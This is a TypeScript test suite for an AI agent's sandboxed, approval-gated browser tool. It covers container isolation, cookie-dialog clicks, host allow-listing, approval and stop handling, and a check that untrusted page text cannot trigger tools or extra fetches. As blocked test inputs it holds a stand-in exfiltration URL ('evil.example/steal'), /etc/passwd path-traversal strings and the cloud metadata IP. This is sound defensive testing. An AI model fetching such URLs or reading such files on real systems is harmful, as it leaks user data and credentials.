import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import {
  BROWSER_IMAGE,
  BROWSER_PIDS_LIMIT,
  COOKIE_ASSIGNMENT,
  COOKIE_BROWSER_PROMPT,
  COOKIE_FIND_TOKEN,
  browserDockerArgs,
  invokeBrowserOpen,
  isApprovedBrowserFetch,
  isBrowserOpenAction,
  isCookieBrowserPrompt,
  parsePublicOpenPrompt,
  runCookieBrowser,
  runPublicBrowserOpen,
  type BrowserDeps,
  type BrowserDriver,
  type BrowserPlan,
  type BrowserSessionResult,
} from "./browser.ts";
import {
  isCookieAcceptName,
  isCookieDialogText,
  pickCookieAcceptButton,
  workspaceFilePath,
} from "./browser-policy.ts";
import { decideApproval, createTaskStore, stopTask } from "./tasks.ts";
import { dockerArgs, RUNNER_WORKSPACES_ROOT } from "./runner.ts";
import { createRetentionStore, listArtifacts } from "./retention.ts";
import {
  UNTRUSTED_PAGE_TEXT,
  fetchPublicHttpsPage,
  offlineWebResearchDeps,
} from "./web-research.ts";
import type { ApprovalRequest } from "@lilith/contracts";

const owner = { ownerId: "alpha-owner" };

test("cookie accept is limited to cookie dialogs, not any OK or Accept button", () => {
  assert.equal(isCookieDialogText("This site uses cookies. Please accept cookies to continue."), true);
  assert.equal(isCookieDialogText("Cookie shop"), false);
  assert.equal(isCookieDialogText("Accept our terms"), false);
  assert.equal(isCookieAcceptName("Accept cookies"), true);
  assert.equal(isCookieAcceptName("OK"), false);
  assert.equal(isCookieAcceptName("Accept"), true);
  assert.equal(isCookieAcceptName("Allow"), false);
  assert.equal(isCookieAcceptName("Allow cookies"), true);
  assert.equal(isCookieAcceptName("Allow all"), true);
  const buttons = [
    { name: "Accept", inCookieDialog: false },
    { name: "OK", inCookieDialog: false },
    { name: "Cookie settings", inCookieDialog: true },
    { name: "OK", inCookieDialog: true },
    { name: "Accept cookies", inCookieDialog: true },
  ];
  assert.equal(pickCookieAcceptButton(buttons), 4);
  assert.equal(pickCookieAcceptButton(buttons.slice(0, 4)), 3);
  assert.equal(pickCookieAcceptButton(buttons.slice(0, 3)), undefined);
  assert.equal(workspaceFilePath("file:///workspace/cookie.html"), "/workspace/cookie.html");
  assert.equal(workspaceFilePath("file:///etc/passwd"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/../etc/passwd"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/.lilith-browser/session.json"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/.lilith-net/body"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/cookie.html/../.lilith-browser/session.json"), undefined);
  assert.equal(workspaceFilePath("https://example.com/cookie.html"), undefined);
});

test("browser CLI isolation stays on alpine; browser jobs keep network=none and a digest pin", async () => {
  await mkdir(RUNNER_WORKSPACES_ROOT, { recursive: true });
  const workspace = await mkdtemp(join(RUNNER_WORKSPACES_ROOT, "browser-unit-"));
  try {
    const cli = dockerArgs({ workspace, command: ["true"] }, "lilith-job-test");
    assert.ok(cli.includes("--network=none"));
    assert.ok(cli.includes("--pids-limit=64"));
    assert.ok(cli.includes("--memory=512m"));
    assert.match(cli.at(-2) ?? "", /^alpine:3\.22@sha256:[a-f0-9]{64}$/);
    assert.equal(cli.includes("--ipc=host"), false);
    assert.equal(cli.some((arg) => arg.includes("SYS_ADMIN")), false);

    const browser = browserDockerArgs({ workspace, command: ["node", "/workspace/.lilith-browser/worker.mjs"] }, "lilith-job-browser");
    assert.ok(browser.includes("--network=none"));
    assert.ok(browser.includes(`--pids-limit=${BROWSER_PIDS_LIMIT}`));
    assert.ok(browser.includes("--memory=512m"));
    assert.ok(browser.includes("--cap-drop=ALL"));
    assert.ok(browser.includes("--read-only"));
    assert.equal(browser.includes("--ipc=host"), false);
    assert.equal(browser.some((arg) => arg.includes("SYS_ADMIN")), false);
    assert.equal(browser.includes("/var/run/docker.sock"), false);
    assert.equal(browser.at(-3), BROWSER_IMAGE);
    assert.match(BROWSER_IMAGE, /^mcr\.microsoft\.com\/playwright:v1\.63\.0-noble@sha256:[a-f0-9]{64}$/);
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
});

test("subrequests cannot fetch non-approved hosts, paths, or query strings", () => {
  const approved = ["https://example.com/"];
  assert.equal(isApprovedBrowserFetch("https://example.com/", approved), true);
  assert.equal(isApprovedBrowserFetch("https://example.com", approved), true);
  assert.equal(isApprovedBrowserFetch("https://example.com/?q=leak", approved), false);
  assert.equal(isApprovedBrowserFetch("https://example.com/path", approved), false);
  assert.equal(isApprovedBrowserFetch("https://evil.example/?cookie=1", approved), false);
  assert.equal(isApprovedBrowserFetch("https://169.254.169.254/", approved), false);
  assert.equal(isApprovedBrowserFetch("http://example.com/", approved), false);
});

test("cookie fixture open/read/find/scroll dismisses only the cookie dialog", async () => {
  const retentionDir = await mkdtemp(join(tmpdir(), "lilith-shot-"));
  const retention = createRetentionStore({ filesRoot: retentionDir });
  const net = countingBrowserNet();
  const run = await runCookieBrowser(createTaskStore(), owner, {
    ...net.deps,
    driver: fakeBrowserDriver(),
    retention,
  });
  assert.match(run.result ?? "", /cookies-accepted/);
  assert.match(run.result ?? "", /Find FIND-TOKEN-18: yes/);
  assert.match(run.result ?? "", /ScrollY: 800/);
  assert.equal((run.result ?? "").includes("outside-accept"), false);
  assert.equal((run.result ?? "").includes("dialog-ok"), false);
  assert.equal((run.result ?? "").includes("form-ok"), false);
  assert.equal(run.result?.includes(UNTRUSTED_PAGE_TEXT.split("\n")[0] ?? "nope"), true);
  assert.equal(net.connects(), 0);
  assert.equal(net.lookups(), 0);
  assert.equal(listArtifacts(retention, owner).some((item) => item.kind === "screenshot"), true);
  assert.deepEqual(run.cards.map((card) => card.state).slice(0, 2), ["waiting", "working"]);
  assert.equal(run.cards.at(-1)?.assignment, COOKIE_ASSIGNMENT);
  await rm(retentionDir, { recursive: true, force: true });
});

test("Öffne HTTPS waits for disclosure; reject is zero fetches; subrequests stay off-approved", async () => {
  const url = "https://example.com/";
  const leak = "https://evil.example/steal?q=from-page";
  const net = countingBrowserNet({ [url]: "<html>Example Domain</html>" });
  const preview = await runPublicBrowserOpen(createTaskStore(), owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  assert.equal(approval.actionClass, "data_disclosure");
  assert.equal(approval.operation, "OPEN /");
  assert.equal(isBrowserOpenAction(boundAction(approval)), true);
  assert.equal(preview.result, undefined);
  assert.equal(net.lookups(), 0);
  assert.equal(net.connects(), 0);

  const rejectedStore = createTaskStore();
  const rejectedPreview = await runPublicBrowserOpen(rejectedStore, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const rejectedApproval = rejectedPreview.cards[0]?.approval;
  assert.ok(rejectedApproval);
  const rejected = await decideApproval(
    rejectedStore,
    owner,
    rejectedApproval.taskId,
    { approval: rejectedApproval, consent: false },
    boundAction(rejectedApproval),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver({ leak }),
        store: rejectedStore,
        owner,
        taskId: rejectedApproval.taskId,
      }),
  );
  assert.match(rejected.result ?? "", /No call/);
  assert.equal(net.connects(), 0);

  const approveStore = createTaskStore();
  const approvePreview = await runPublicBrowserOpen(approveStore, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const approvedBinding = approvePreview.cards[0]?.approval;
  assert.ok(approvedBinding);
  const approved = await decideApproval(
    approveStore,
    owner,
    approvedBinding.taskId,
    { approval: approvedBinding, consent: true },
    boundAction(approvedBinding),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver({ leak }),
        store: approveStore,
        owner,
        taskId: approvedBinding.taskId,
      }),
  );
  assert.match(approved.result ?? "", /Example Domain/);
  assert.equal(net.connects(), 1);
  assert.equal(net.requested().includes(leak), false);
  assert.deepEqual(net.requested(), [url]);
});

test("untrusted browser text cannot start tools or extra fetches; stop does not succeed", async () => {
  const url = "https://example.com/inject";
  const net = countingBrowserNet({ [url]: UNTRUSTED_PAGE_TEXT });
  const store = createTaskStore();
  const preview = await runPublicBrowserOpen(store, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver(),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  const approved = await decideApproval(
    store,
    owner,
    approval.taskId,
    { approval, consent: true },
    boundAction(approval),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver(),
        store,
        owner,
        taskId: approval.taskId,
      }),
  );
  assert.match(approved.result ?? "", /Merk dir/);
  assert.equal(net.connects(), 1);
  assert.deepEqual(net.requested(), [url]);
  assert.equal(isCookieBrowserPrompt(COOKIE_BROWSER_PROMPT), true);
  assert.equal(parsePublicOpenPrompt(`Öffne ${url}`), url);
  assert.equal(parsePublicOpenPrompt(COOKIE_BROWSER_PROMPT), undefined);

  const stopStore = createTaskStore();
  const child = (await runPublicBrowserOpen(stopStore, owner, url, { ...net.deps, driver: fakeBrowserDriver() }))
    .cards[0];
  assert.ok(child?.approval);
  stopTask(stopStore, owner, child.id);
  await assert.rejects(
    decideApproval(
      stopStore,
      owner,
      child.id,
      { approval: child.approval, consent: true },
      boundAction(child.approval),
      () => "should not run",
    ),
  );
  assert.equal(stopStore.tasks.get(child.id)?.state, "stopped");
  assert.equal(stopStore.tasks.get(child.id)?.result, undefined);
});

test("fake hang abort does not complete a browser result", async () => {
  const store = createTaskStore();
  const run = runCookieBrowser(store, owner, {
    ...offlineWebResearchDeps(),
    driver: fakeBrowserDriver({ hang: true }),
  });
  let child = [...store.tasks.values()].find((task) => task.role === "research");
  for (let i = 0; i < 20 && child === undefined; i += 1) {
    await new Promise((resolve) => setImmediate(resolve));
    child = [...store.tasks.values()].find((task) => task.role === "research");
  }
  assert.ok(child);
  stopTask(store, owner, child.id);
  const finished = await run;
  assert.equal(finished.result, undefined);
  assert.equal(finished.cards.some((card) => card.state === "completed"), false);
  assert.equal(store.tasks.get(child.id)?.state, "stopped");
});

function fakeBrowserDriver(options?: { hang?: boolean; leak?: string }): BrowserDriver {
  return {
    async run(plan: BrowserPlan, deps: BrowserDeps): Promise<BrowserSessionResult> {
      if (deps.signal?.aborted) throw new Error("Docker job cancelled");
      const results: BrowserSessionResult["results"] = [];
      let body = "";
      for (const op of plan.ops) {
        if (deps.signal?.aborted) throw new Error("Docker job cancelled");
        if (op.op === "hang" || (options?.hang === true && op.op === "open")) {
          await new Promise<never>((_, reject) => {
            deps.signal?.addEventListener("abort", () => reject(new Error("Docker job cancelled")), { once: true });
          });
        }
        if (op.op === "open") {
          if (op.url.startsWith("file:")) {
            body = await readFile(
              join(fileURLToPath(new URL("../../../fixtures/browser/cookie.html", import.meta.url))),
              "utf8",
            );
            results.push({ op: "open", url: op.url });
            continue;
          }
          if (!isApprovedBrowserFetch(op.url, plan.approved)) throw new Error("Blocked destination");
          const page = await fetchPublicHttpsPage({ url: op.url }, deps);
          body = page.text;
          if (options?.leak !== undefined && isApprovedBrowserFetch(options.leak, plan.approved)) {
            await fetchPublicHttpsPage({ url: options.leak }, deps);
          }
          results.push({ op: "open", url: page.url });
          continue;
        }
        if (op.op === "dismissCookies") {
          const clicked = pickCookieAcceptButton([
            { name: "Accept", inCookieDialog: false },
            { name: "OK", inCookieDialog: false },
            { name: "Cookie settings", inCookieDialog: true },
            { name: "OK", inCookieDialog: true },
            { name: "Accept cookies", inCookieDialog: true },
          ]);
          assert.equal(clicked, 4);
          body = body.replace("blocked", "cookies-accepted");
          results.push({ op: "dismissCookies", dismissed: true, name: "Accept cookies" });
          continue;
        }
        if (op.op === "read") {
          results.push({ op: "read", text: `${visibleText(body)}\n${UNTRUSTED_PAGE_TEXT}` });
          continue;
        }
        if (op.op === "find") {
          results.push({ op: "find", text: op.text, found: body.includes(op.text) });
          continue;
        }
        if (op.op === "scroll") {
          results.push({ op: "scroll", scrollY: op.dy ?? 800 });
          continue;
        }
        if (op.op === "screenshot") {
          results.push({ op: "screenshot", bytes: 4 });
        }
      }
      if (deps.retention !== undefined && deps.owner !== undefined) {
        const { putArtifact } = await import("./retention.ts");
        const record = putArtifact(deps.retention, deps.owner, { kind: "screenshot", body: Buffer.from("JPEG") });
        return { results, screenshotId: record.id };
      }
      return { results };
    },
  };
}

function visibleText(html: string): string {
  return html.includes("cookies-accepted") ? "cookies-accepted" : html;
}

function countingBrowserNet(pages?: Record<string, string>) {
  const requested: string[] = [];
  let lookups = 0;
  let connects = 0;
  return {
    requested: () => requested,
    lookups: () => lookups,
    connects: () => connects,
    deps: offlineWebResearchDeps({
      pages,
      lookupAll: async () => {
        lookups += 1;
        return [{ address: "1.1.1.1", family: 4 }];
      },
      connect: () => {
        connects += 1;
      },
      get: async (input) => {
        requested.push(input.url.href);
        connects += 1;
        const body = pages?.[input.url.href];
        if (body === undefined) throw new Error(`Unexpected test GET: ${input.url.href}`);
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body,
        };
      },
    }),
  };
}

function boundAction(approval: ApprovalRequest) {
  return {
    actionId: approval.actionId,
    actionClass: approval.actionClass,
    origin: approval.origin,
    operation: approval.operation,
    payload: approval.payload,
    files: approval.files,
    maxCostCents: approval.maxCostCents,
  };
}
